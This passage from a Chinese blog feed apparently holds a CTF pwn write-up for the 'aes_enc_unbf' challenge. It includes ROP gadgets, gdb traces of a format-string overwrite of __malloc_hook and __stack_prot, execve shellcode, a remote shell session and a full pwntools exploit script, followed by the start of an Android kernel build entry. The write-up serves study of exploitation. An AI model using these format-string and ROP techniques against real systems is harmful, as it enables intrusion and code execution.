eax ; ret</span><br><span class="line">0x0818f350 : pop eax ; ret 0xffe4</span><br><span class="line">0x0817b0e9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure></li></ul><p>pop_eax = 0x0804c906</p><ul><li>jmp_esp<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/unbreakable_encryption$ ROPgadget --binary aes_enc_unbf --only &quot;jmp&quot;|grep esp</span><br><span class="line">0x08174bec : jmp esp</span><br></pre></td></tr></table></figure></li></ul><p>jmp_esp = 0x08174bec </p><h3 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h3><p>要确定偏移需要多次调试，没有什么好的方法。<br>这里我也是把已经调试好的偏移直接带入跟了一遍而已。<br>要在pwntools里用gdb调试，首先要先设置好断点文件，然后gdb.attach(r,open(filename))<br>得到断点文件的方法如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x8048d73</span><br><span class="line">Breakpoint 1 at 0x8048d73</span><br><span class="line">gef➤  save breakpoints filename</span><br></pre></td></tr></table></figure></p><p>然后执行程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/sakura/unbreakable_encryption# python exp.py 1</span><br><span class="line">[+] Starting local process &apos;./aes_enc_unbf&apos;: pid 25217</span><br><span class="line">debug?</span><br><span class="line">[*] X: 0x804</span><br><span class="line">[*] Y: 0x84dc</span><br><span class="line">[*] running in new terminal: /usr/bin/gdb -q  &quot;/home/sakura/unbreakable_encryption/aes_enc_unbf&quot; 25217 -x &quot;/tmp/pwndl_JQG.gdb&quot;</span><br><span class="line">[+] Waiting for debugger: Done</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1 at 0x8048d73</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">gef➤  si</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────────────────────[ code:i386 ]────</span><br><span class="line">    0x81115cb &lt;__correctly_grouped_prefixmb+715&gt; jmp    0x8111578 &lt;__correctly_grouped_prefixmb+632&gt;</span><br><span class="line">    0x81115cd                  xchg   ax, ax</span><br><span class="line">    0x81115cf                  nop    </span><br><span class="line"> →  0x81115d0 &lt;printf+0&gt;       sub    esp, 0xc</span><br><span class="line">    0x81115d3 &lt;printf+3&gt;       lea    eax, [esp+0x14]</span><br><span class="line">    0x81115d7 &lt;printf+7&gt;       sub    esp, 0x4</span><br><span class="line">    0x81115da &lt;printf+10&gt;      push   eax</span><br><span class="line">    0x81115db &lt;printf+11&gt;      push   DWORD PTR [esp+0x18]</span><br><span class="line">    0x81115df &lt;printf+15&gt;      push   DWORD PTR ds:0x8230538</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-155208.png" alt=""><br>printf执行完后，malloc_hook等于main函数的首地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x /gx 0x08230598</span><br><span class="line">0x8230598 &lt;__malloc_hook&gt;:0x0000000008048ce0</span><br></pre></td></tr></table></figure></p><p>跳回main函数，为了确定跳回，先在main下个断点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x08048CE0</span><br><span class="line">gef➤  c</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-160953.png" alt=""><br>继续执行，断在printf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  c</span><br><span class="line">gef➤  si # 我这里si的目的是步入printf，不过其实没什么用，不步入的话esp就不指向返回地址，而是格式化串本身。</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-161430.png" alt=""><br><strong>注意hhn代表只覆盖单字节。</strong><br>这次printf结束之后,__stack_prot的值被修改为7。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/gx 0x0822EC98</span><br><span class="line">0x822ec98 &lt;__stack_prot&gt;:0x0000000000000007</span><br></pre></td></tr></table></figure></p><p>继续c还会再跳回main函数，因为malloc_hook还指向main函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">...</span><br><span class="line"> →  0x8048ce0 &lt;main+0&gt;         lea    ecx, [esp+0x4]</span><br><span class="line">    0x8048ce4 &lt;main+4&gt;         and    esp, 0xfffffff0</span><br><span class="line">    0x8048ce7 &lt;main+7&gt;         push   DWORD PTR [ecx-0x4]</span><br><span class="line">    0x8048cea &lt;main+10&gt;        push   ebp</span><br><span class="line">    0x8048ceb &lt;main+11&gt;        mov    ebp, esp</span><br><span class="line">    0x8048ced &lt;main+13&gt;        push   ecx</span><br></pre></td></tr></table></figure></p><p>继续c，执行到printf,这次我不再步入printf里，所以esp就指向格式化串。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">gef➤  <span class="built_in">stack</span> <span class="number">60</span></span><br><span class="line"><span class="number">0xffffcfa0</span>│+<span class="number">0x00</span>: <span class="number">0xffffcfbc</span> 格式化字符串</span><br><span class="line"><span class="number">0xffffcfa4</span>│+<span class="number">0x04</span>: <span class="number">0xffffcfbc</span> offset <span class="number">1</span></span><br><span class="line"><span class="number">0xffffcfa8</span>│+<span class="number">0x08</span>: <span class="number">0x00000000</span> offset <span class="number">2</span></span><br><span class="line"><span class="number">0xffffcfac</span>│+<span class="number">0x0c</span>: <span class="number">0xffffffff</span> offset <span class="number">3</span></span><br><span class="line"><span class="number">0xffffcfb0</span>│+<span class="number">0x10</span>: <span class="number">0x00000000</span> offset <span class="number">4</span></span><br><span class="line"><span class="number">0xffffcfb4</span>│+<span class="number">0x14</span>: <span class="number">0x00000000</span> offset <span class="number">5</span></span><br><span class="line"><span class="number">0xffffcfb8</span>│+<span class="number">0x18</span>: <span class="number">0x0000000a</span> offset <span class="number">6</span></span><br><span class="line"><span class="number">0xffffcfbc</span>│+<span class="number">0x1c</span>: <span class="number">0x08230598</span> offset <span class="number">7</span></span><br><span class="line"><span class="number">0xffffcfc0</span>│+<span class="number">0x20</span>: <span class="number">0x08230599</span> offset <span class="number">8</span></span><br><span class="line"><span class="number">0xffffcfc4</span>│+<span class="number">0x24</span>: <span class="number">0x0823059a</span> offset <span class="number">9</span></span><br><span class="line"><span class="number">0xffffcfc8</span>│+<span class="number">0x28</span>: <span class="number">0x0823059b</span> offset <span class="number">10</span></span><br><span class="line"><span class="number">0xffffcfcc</span>│+<span class="number">0x2c</span>: <span class="string">"%240u%7$hhn%256u%8$hhn%512u%9$hhn%768u%10$hhnAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfd0</span>│+<span class="number">0x30</span>: <span class="string">"u%7$hhn%256u%8$hhn%512u%9$hhn%768u%10$hhnAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfd4</span>│+<span class="number">0x34</span>: <span class="string">"hhn%256u%8$hhn%512u%9$hhn%768u%10$hhnAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfd8</span>│+<span class="number">0x38</span>: <span class="string">"256u%8$hhn%512u%9$hhn%768u%10$hhnAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfdc</span>│+<span class="number">0x3c</span>: <span class="string">"%8$hhn%512u%9$hhn%768u%10$hhnAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfe0</span>│+<span class="number">0x40</span>: <span class="string">"hn%512u%9$hhn%768u%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfe4</span>│+<span class="number">0x44</span>: <span class="string">"12u%9$hhn%768u%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfe8</span>│+<span class="number">0x48</span>: <span class="string">"9$hhn%768u%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfec</span>│+<span class="number">0x4c</span>: <span class="string">"n%768u%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcff0</span>│+<span class="number">0x50</span>: <span class="string">"8u%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcff4</span>│+<span class="number">0x54</span>: <span class="string">"0$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcff8</span>│+<span class="number">0x58</span>: <span class="string">"nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcffc</span>│+<span class="number">0x5c</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffd000</span>│+<span class="number">0x60</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffd004</span>│+<span class="number">0x64</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffd008</span>│+<span class="number">0x68</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffd00c</span>│+<span class="number">0x6c</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd010</span>│+<span class="number">0x70</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd014</span>│+<span class="number">0x74</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd018</span>│+<span class="number">0x78</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd01c</span>│+<span class="number">0x7c</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd020</span>│+<span class="number">0x80</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd024</span>│+<span class="number">0x84</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd028</span>│+<span class="number">0x88</span>: <span class="string">"AAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd02c</span>│+<span class="number">0x8c</span>: <span class="string">"AAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd030</span>│+<span class="number">0x90</span>: <span class="string">"AAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd034</span>│+<span class="number">0x94</span>: <span class="string">"AAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd038</span>│+<span class="number">0x98</span>: <span class="number">0x00414141</span> (<span class="string">"AAA"</span>?)</span><br><span class="line"><span class="number">0xffffd03c</span>│+<span class="number">0x9c</span>: <span class="number">0x12cda400</span> #<span class="meta"># canary ##</span></span><br><span class="line"><span class="number">0xffffd040</span>│+<span class="number">0xa0</span>: <span class="number">0x42424242</span></span><br><span class="line"><span class="number">0xffffd044</span>│+<span class="number">0xa4</span>: <span class="number">0xffffd04c</span>  →  <span class="number">0x0822ece8</span>  →  <span class="number">0xffffd6bc</span>  →  <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffffd048</span>│+<span class="number">0xa8</span>: <span class="number">0x0804c906</span>  →  &lt;EVP_CIPHER_CTX_key_length+<span class="number">6</span>&gt; pop eax ← $ebp</span><br><span class="line"><span class="number">0xffffd04c</span>│+<span class="number">0xac</span>: <span class="number">0x0822ece8</span>  →  <span class="number">0xffffd6bc</span>  →  <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffffd050</span>│+<span class="number">0xb0</span>: <span class="number">0x081715d0</span>  →  &lt;_dl_make_stack_executable+<span class="number">0</span>&gt; push esi</span><br><span class="line"><span class="number">0xffffd054</span>│+<span class="number">0xb4</span>: <span class="number">0x08174bec</span>  →  &lt;____strtof_l_internal+<span class="number">7900</span>&gt; jmp esp</span><br><span class="line"><span class="number">0xffffd058</span>│+<span class="number">0xb8</span>: <span class="number">0x6850c031</span> #<span class="meta"># shellcode ##</span></span><br><span class="line"><span class="number">0xffffd05c</span>│+<span class="number">0xbc</span>: <span class="number">0x68732f2f</span></span><br><span class="line"><span class="number">0xffffd060</span>│+<span class="number">0xc0</span>: <span class="number">0x69622f68</span></span><br><span class="line"><span class="number">0xffffd064</span>│+<span class="number">0xc4</span>: <span class="number">0x5950506e</span></span><br><span class="line"><span class="number">0xffffd068</span>│+<span class="number">0xc8</span>: <span class="number">0x6ae3895a</span></span><br><span class="line"><span class="number">0xffffd06c</span>│+<span class="number">0xcc</span>: <span class="number">0x5034585b</span></span><br><span class="line"><span class="number">0xffffd070</span>│+<span class="number">0xd0</span>: <span class="number">0x000080cd</span></span><br><span class="line"><span class="number">0xffffd074</span>│+<span class="number">0xd4</span>: <span class="number">0x080481c8</span>  →  &lt;_init+<span class="number">0</span>&gt; push ebx</span><br></pre></td></tr></table></figure></p><p>printf执行完成后，malloc_hook已经恢复为0,不再会跳回main了，另外可以看出我们的leak出的canary和shellcode已经写入了栈里，实现了栈溢出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x /gx 0x08230598</span><br><span class="line">0x8230598 &lt;__malloc_hook&gt;:0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>当main函数执行结束，要ret的时候，就返回到我们布置好的利用链里。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0xffffd048│+0x00: 0x0804c906  →  &lt;EVP_CIPHER_CTX_key_length+6&gt; pop eax ← $esp</span><br><span class="line">0xffffd04c│+0x04: 0x0822ece8  →  0xffffd6bc  →  0x00000000 ← $ecx</span><br><span class="line">0xffffd050│+0x08: 0x081715d0  →  &lt;_dl_make_stack_executable+0&gt; push esi</span><br><span class="line">0xffffd054│+0x0c: 0x08174bec  →  &lt;____strtof_l_internal+7900&gt; jmp esp</span><br><span class="line">0xffffd058│+0x10: 0x6850c031</span><br><span class="line">0xffffd05c│+0x14: 0x68732f2f</span><br><span class="line">0xffffd060│+0x18: 0x69622f68</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-164412.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0x0822ece8  →  0xffffd6bc  →  0x00000000</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-164523.png" alt=""><br>栈可执行打开,并跳入shellcode执行。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-164623.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">→ 0xffffd070                  int    0x80</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-06-164825.png" alt=""></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>exp来源<a href="https://github.com/phieulang1993/ctf-writeups/blob/master/2018/pragyan/aes_enc_unbf/aes_enc_unbf.py" target="_blank" rel="noopener">phieulang1993</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/unbreakable_encryption$ vim exp.py </span><br><span class="line">sakura@ubuntu:~/unbreakable_encryption$ python exp.py 2</span><br><span class="line">[+] Opening connection to 128.199.224.175 on port 33100: Done</span><br><span class="line">[*] X: 0x804</span><br><span class="line">[*] Y: 0x84dc</span><br><span class="line">[*] \x98�\x9a\x05\x98\x05%7$n%2040x%8$hn%34012x%9$hnXXXX|%39$p|%41$p|YYYY</span><br><span class="line">[*] canary: 0xd7f0b100</span><br><span class="line">[*] stack: 0xffd88bb0</span><br><span class="line">[*] \x98�%259u%7$hhn</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Your message is :- </span><br><span class="line">\x98\x05\x99\x05\x9a\x05\x9b\xspan><br><span class="line"></span><br><span class="line">$ </span><br><span class="line"></span><br><span class="line"> The encrypted message for the given plaintext is :- </span><br><span class="line">0000 - c5 27 69 67 81 b4 d5 26-dc ad 96 83 82 d5 c2 9c   .&apos;ig...&amp;........</span><br><span class="line">0010 - b7 62 f0 37 04 b8 7f 63-8a 21 2c 23 51 42 5d d2   .b.7...c.!,#QB].</span><br><span class="line">0020 - c5 71 36 e2 ce 57 59 5c-1b 1b 3d 1e 23 69 65 a3   .q6..WY\..=.#ie.</span><br><span class="line">0030 - 0e 20 af 87 59 5c 50 eb-c7 64 5e 9c 72 ef ed df   . ..Y\P..d^.r...</span><br><span class="line">0040 - ef 96 47 d8 c6 7f 44 4d-e7 8e 38 ee f2 10 af 95   ..G...DM..8.....</span><br><span class="line">0050 - 3e 72 7b 42 84 54 72 55-c5 27 9c c4 02 28 51 79   &gt;r&#123;B.TrU.&apos;...(Qy</span><br><span class="line">0060 - 68 f1 3b 20 70 11 ab f6-12 c9 49 2c 4d 6c 92 f4   h.; p.....I,Ml..</span><br><span class="line">0070 - 5d 69 bd 24 79 8d ad ff-c2 eb ad 4d e0 65 1e f1   ]i.$y......M.e..</span><br><span class="line"></span><br><span class="line">Decrypted text is:</span><br><span class="line">\x98\x05\x99\x05\x9a\x05\x9b\x05%240u%7$hhn%256u%8$hhn%512u%9$hhn%768u%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">core</span><br><span class="line">iv.aes</span><br><span class="line">key.aes</span><br><span class="line">x.out</span><br><span class="line">$ cat *.aes</span><br><span class="line">IV&#123;212&amp;5^V!-!&#125;IV</span><br><span class="line">BEGIN-KEY&#123;4x@$^%`w~d##*9&#125;END-KEY</span><br></pre></td></tr></table></figure><p>解密AES得到flag为pctf{th4t_m0m3n1-wh3n~f0rm41`SpiLls_0v3r}</p><h2 id="其他exp-todo"><a href="#其他exp-todo" class="headerlink" title="其他exp(todo)"></a>其他exp(todo)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = remote("128.199.224.175", 33000)</span></span><br><span class="line">p = process(<span class="string">"./aes_enc_unbf"</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = <span class="number">0x08230598</span></span><br><span class="line">main = <span class="number">0x8048ce0</span></span><br><span class="line">start = <span class="number">0x8048796</span></span><br><span class="line">free_hook = <span class="number">0x082345f0</span></span><br><span class="line">int_80 = <span class="number">0x810fb5e</span></span><br><span class="line">binsh_poi = <span class="number">0x8234ec4</span></span><br><span class="line">bss = <span class="number">0x8234ecc</span></span><br><span class="line">test_poi = <span class="number">0x8048c6a</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x080487f8</span></span><br><span class="line">nop = <span class="number">0x0804fe2f</span></span><br><span class="line">pop_eax = <span class="number">0x0804c906</span></span><br><span class="line">pop_ebx = <span class="number">0x080ed07f</span></span><br><span class="line">pop_ecx = <span class="number">0x081b9a41</span></span><br><span class="line">pop_edx = <span class="number">0x08068212</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = []</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;free_hook: main&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;binsh_poi: <span class="number">0x6e69622f</span>&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;binsh_poi+<span class="number">4</span>: <span class="number">0x0068732f</span>&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">4</span>: pop_eax&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">8</span>:  <span class="number">0xc</span>&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">12</span>: pop_ebx&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">16</span>: binsh_poi&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">20</span>: pop_ecx&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">24</span>: <span class="number">0x0</span>&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">28</span>: pop_edx&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">32</span>: <span class="number">0x0</span>&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">36</span>: int_80&#125;))</span><br><span class="line"></span><br><span class="line">t1 = <span class="string">"%&#123;&#125;c%42$n"</span>.format(bss)</span><br><span class="line">t2 = fmtstr_payload(<span class="number">7</span>, &#123;free_hook: <span class="number">0x0</span>&#125;)</span><br><span class="line"></span><br><span class="line">e = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line"></span><br><span class="line">    p.sendline(i)</span><br><span class="line">    <span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(t1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33332</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    p.recv()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(t2)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 格式化字符串 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>android kernel编译过程详细</title>
      <link href="/2018/03/03/kernel_android/"/>
      <url>/2018/03/03/kernel_android/</url>
      <content type="html"><![CDATA[<h2 id="下载源代码"><a href="#下载源代码" class="headerlink" title="下载源代码"></a>下载源代码</h2><p><a href="https://source.android.com/source/building-kernels" target="_blank" rel="noopener">https://source.android.com/source/building-kernels</a><br>承接之前编译的android4.4.4的系统源码，所以说是模拟平台，用goldfish<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ git clone https://aosp.tuna.tsinghua.edu.cn/kernel/goldfish</span><br></pre></td></tr></table></figure></p><h2 id="查看各种版本的goldfish"><a href="#查看各种版本的goldfish" class="headerlink" title="查看各种版本的goldfish"></a>查看各种版本的goldfish</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ cd goldfish/</span><br><span 